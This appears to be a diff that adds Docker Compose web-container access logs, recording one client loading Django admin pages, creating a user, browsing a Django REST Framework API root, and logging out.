+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/forms.css HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3187 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/widgets.css HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/forms.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/core.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/actions.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/urlify.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/js/change_form.js HTTP/1.1" 200 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:42 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:50 +0000] "POST /admin/auth/user/add/ HTTP/1.1" 200 7637 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/forms.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3187 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/forms.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/core.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/actions.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:39:51 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:12 +0000] "POST /admin/auth/user/add/ HTTP/1.1" 302 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:12 +0000] "GET /admin/auth/user/add/ HTTP/1.1" 200 7574 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/forms.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 3187 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/forms.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/core.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/actions.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0 "http://206.189.68.96/admin/auth/user/add/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0 "http://206.189.68.96/static/admin/css/fonts.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:13 +0000] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 0 "http://206.189.68.96/static/admin/css/base.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /api/v1/ HTTP/1.1" 200 10974 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:18 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /api-auth/logout/?next=/api/v1/ HTTP/1.1" 302 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
